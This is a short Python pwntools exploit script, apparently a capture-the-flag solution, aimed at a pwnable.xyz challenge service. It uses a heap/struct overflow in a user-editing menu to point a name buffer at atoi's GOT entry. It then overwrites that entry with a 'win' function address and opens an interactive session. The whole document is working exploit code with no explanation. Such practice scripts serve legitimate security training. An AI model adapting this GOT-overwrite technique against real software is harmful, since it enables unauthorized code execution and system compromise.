from pwn import *

r = remote("svc.pwnable.xyz", 30011)

sla = r.sendlineafter
sa = r.sendafter


def create_user(name, age):
    sla(b"> ", b"1")
    sa(b"Name: ", name)
    sla(b"Age: ", age)


def print_user():
    sla(b"> ", b"2")


def edit_user(name, age):
    sla(b"> ", b"3")
    sa(b"Name: ", name)
    sla(b"Age: ", age)


win = 0x400B71
atoi_got = 0x602068

create_user(b"a", b"1")
edit_user(b"a", b"1" + b"a" * 0xF + p64(atoi_got))
edit_user(p64(win), b"1")

r.interactive()
